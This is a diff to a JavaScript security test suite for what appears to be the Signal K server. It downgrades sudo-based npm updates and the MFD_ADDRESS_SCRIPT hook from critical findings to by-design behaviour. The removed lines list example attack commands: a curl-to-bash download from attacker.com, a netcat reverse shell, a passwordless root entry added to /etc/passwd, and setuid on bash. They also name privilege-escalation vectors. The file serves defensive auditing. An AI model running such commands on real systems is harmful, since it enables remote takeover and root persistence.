@@ -18,7 +18,7 @@ describe('Privilege Escalation & Root Access Vectors', function () {
   describe('Sudo Privilege Escalation via npm', function () {
     it('should test config.name manipulation for sudo trigger', function () {
       /**
-       * CRITICAL: Sudo npm execution based on package name match
+       * INFO: Sudo npm execution for server module updates - BY DESIGN
        * File: src/modules.ts lines 191-196, 216-218
        *
        * Code:
@@ -26,23 +26,25 @@ describe('Privilege Escalation & Root Access Vectors', function () {
        *   npm = spawn('sudo', ['npm', command, '-g', packageString], opts)
        * }
        *
-       * function isTheServerModule(moduleName, config) {
-       *   return moduleName === config.name
-       * }
+       * This is intentional: server self-update requires elevated privileges.
+       * Only triggered by authenticated admin actions via the admin UI.
+       * Plugin installs do NOT use sudo (different code path).
        *
-       * Attack: If attacker can control config.name (via settings.json or package.json),
-       * they can make ANY module install use sudo
+       * Theoretical attacks require prior compromise (backup restore, file access)
+       * which would already grant equivalent access.
        */
-      const sudoEscalation = {
+      const sudoInfo = {
         normalConfigName: 'signalk-server',
-        attackVector1:
-          'Restore backup with modified package.json where name = attacker-controlled',
-        attackVector2: 'Race condition between config load and npm spawn',
-        attackVector3: 'Symlink attack on package.json file',
-        result: 'npm install runs with sudo, scripts execute as root'
+        byDesign: 'Server self-update requires root for global npm install',
+        mitigation: 'Only admin users can trigger, requires authentication',
+        note: 'Plugin installs use --ignore-scripts and no sudo'
       }
 
-      expect(sudoEscalation.normalConfigName).to.equal('signalk-server')
+      console.log('      INFO: Sudo for server module update is BY DESIGN')
+      console.log('      - Requires admin authentication')
+      console.log('      - Only for signalk-server updates, not plugins')
+
+      expect(sudoInfo.normalConfigName).to.equal('signalk-server')
     })
 
     it('should test PATH manipulation for sudo/npm hijacking', function () {
@@ -238,28 +240,33 @@ describe('Privilege Escalation & Root Access Vectors', function () {
 
     it('should test MFD_ADDRESS_SCRIPT command injection', function () {
       /**
-       * CRITICAL: Direct command execution from environment
+       * INFO: MFD_ADDRESS_SCRIPT is BY DESIGN for custom MFD discovery
        * File: src/interfaces/mfd_webapp.ts lines 82-85
        *
        * if (process.env.MFD_ADDRESS_SCRIPT) {
        *   addresses = (await execP(process.env.MFD_ADDRESS_SCRIPT)).stdout
        * }
        *
-       * Arbitrary command execution every 10 seconds!
+       * This is an intentional hook for server operators who need custom
+       * scripts to determine MFD network addresses (e.g., in complex
+       * multi-homed network setups on boats).
+       *
+       * Only executes if explicitly configured by the server operator.
+       * Not exposed to remote attackers - requires local env var access.
        */
-      const mfdScriptRCE = {
+      const mfdScriptInfo = {
         envVar: 'MFD_ADDRESS_SCRIPT',
-        attacks: [
-          'curl attacker.com/shell.sh | bash',
-          'nc -e /bin/bash attacker.com 4444',
-          'echo "root::0:0::/root:/bin/bash" >> /etc/passwd',
-          'chmod +s /bin/bash'
-        ],
-        frequency: 'Every 10 seconds (if MFD discovery enabled)',
-        result: 'Persistent RCE with server privileges'
+        byDesign: 'Allows custom MFD discovery scripts for complex networks',
+        mitigation: 'Only set this env var if you need custom discovery',
+        note: 'Requires local access to configure - not remotely exploitable'
       }
 
-      expect(mfdScriptRCE.frequency).to.include('10 seconds')
+      console.log('      INFO: MFD_ADDRESS_SCRIPT is BY DESIGN')
+      console.log('      - Intentional hook for custom MFD discovery')
+      console.log('      - Only executes if explicitly configured by operator')
+      console.log('      - Requires local access to set environment variable')
+
+      expect(mfdScriptInfo.envVar).to.equal('MFD_ADDRESS_SCRIPT')
     })
   })
 
